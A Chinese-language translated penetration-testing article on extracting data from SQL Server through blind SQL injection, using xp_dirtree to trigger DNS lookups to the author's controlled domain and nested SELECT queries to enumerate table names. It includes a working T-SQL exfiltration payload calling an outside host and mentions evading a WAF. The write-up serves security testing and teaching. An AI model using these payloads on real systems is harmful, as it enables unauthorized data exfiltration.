**泄露数据的方法有许多，但你是否知道可以使用DNS和SQLi从数据库中获取数据样本？本文我将为大家介绍一些利用SQL盲注从DB服务器枚举和泄露数据的技术。**

在最近的一个Web应用测试中，我发现了一个潜在的SQLi漏洞。使用Burp的Collaborator服务通过DNS交互最终我确认了该SQL注入漏洞的存在。我尝试使用SQLmap进行一些额外的枚举和泄露，但由于[SQLmap
header](https://github.com/sqlmapproject/sqlmap/issues/341)的原因WAF阻止了我的请求。我需要另一种方法来验证SQLi并显示可以从服务器恢复数据。

![使用DNS和SQLi从数据库中泄露数据](https://image.3001.net/images/20190201/1548985987_5c53a683e352e.png!small)

在[之前的文章](https://www.redsiege.com/blog/2018/09/capturing-sql-server-user-hash-with-sqli/)中，我向大家展示了如何使用xp_dirtree通过SQLi来捕获SQL
Server用户哈希值的方法。这里我尝试了相同的方法，但由于客户端防火墙上的出站过滤而失败了。此外，在上篇文章中我还引用了[GracefulSecurity的文章](https://www.gracefulsecurity.com/sql-injection-out-of-band-exploitation/)内容，而在本文中它也将再次派上用场。

即使有出站过滤，xp_dirtree仍可用于从网络中泄露数据。这是因为SQL服务器必须在xp_dirtree操作的目标上执行DNS查找。因此，我们可以将数据添加为域名的主机或子域部分。例如，如果我在collaborator.redsiege.net上设置DNS服务器，我可以强制xp_dirtree在data.collaborator.redsiege.net上执行DNS查找，我的DNS服务器将接收该主机的查询，允许我提取来自请求的数据。可能这么说你还有些混乱，我们通过一个实例来讲解。

请思考以下代码：

    
    
    DECLARE @data varchar(1024);
    SELECT @data = (SELECT HOST_NAME()); 
    EXEC('master.dbo.xp_dirtree "\\'+@data+'.collaborator.redsiege.net\foo$"');

在此SQL查询中，我们声明了一个名为data的变量，我们使用SELECT
HOST_NAME()的结果来填充该变量，然后在\\\hostname.collaborator.redsiege.net上尝试xp_dirtree。

![HostNameQuery.png](https://image.3001.net/images/20190201/1548986046_5c53a6be2c52b.png!small)

我的测试系统名为INTRUDER。在我的测试系统上执行这个查询导致了对INTRUDER.collaborator.redsiege.net的查找，如下所示。

![HostnameEnum-1080x54.png](https://image.3001.net/images/20190201/1548986091_5c53a6eb90de2.png!small)

在这一点上，我知道有一种可靠的方法可以来泄露数据，即使需要手动完成。当然，对于这个演示我使用SQL Server Management
Studio来显示结果发出查询，但实际上这与通过SQLi实现这一点并没有太大区别，唯一的不同就是需要对部分查询进行URL编码。

在下面的示例中，红框中的查询语句将会为我们从Northwind数据库中返回表名。

![query-1-1080x183.png](https://image.3001.net/images/20190201/1548986168_5c53a7384f0fa.png!small)

在该查询中你应该已经注意到了有2个SELECT语句。内部SELECT语句（在上面截图中调用的）返回Northwind数据库中表名的前10个结果，并按升序字母顺序排序。然后，外部（第一个）SELECT语句选择按字母顺序降序排序的结果集的第一个结果。此查询的结果是我们检索Northwind数据库中第10个表的名称。你是不是感到有些疑惑？让我们来分解下。

以下内部的SELECT语句，它将返回10个结果并按升序字母顺序排序。

![tabledemo2.png](https://image.3001.net/images/20190201/1548986202_5c53a75a1fa29.png!small)

如下所示，完整的查询只返回第10个表的名称。这是因为我们首先返回了10个结果，并按升序字母顺序排序，然后我们又执行了第二个SELECT，其中只返回按降序字母顺序排序的第一个结果。这样一来查询结果将只会为我们返回表名列表中的第10个结果。

![tabledemo1-1080x250.png](https://image.3001.net/images/20190201/1548986234_5c53a77a5506f.png!small)

知道了这一点后，我们就可以使用Intruder迭代所有可能的表名，只需修改第二个SELECT语句并增加每个请求中的结果数即可。

![ugly.png](https://image.3001.net/images/20190201/1548986256_5c53a7902c251.png!small)

如果你在测试中碰到SQL盲注而SQLmap无法帮助你完成任务时，你可以参考以下我找到的一些资料链接，或许它们能帮你完成任务甚至为你带来新的思考：

> <http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-> cheat-sheet>
>
> <https://www.gracefulsecurity.com/sql-injection-out-of-band-exploitation/>
>
>
> <https://www.w3schools.com/SQL/trysqlserver.asp?filename=trysql_func_sqlserver_substring>

 ***参考来源：[redsiege](https://www.redsiege.com/blog/2018/11/sqli-data-exfiltration-via-dns/)，FB小编secist编译，转载请注明来自FreeBuf.COM**  

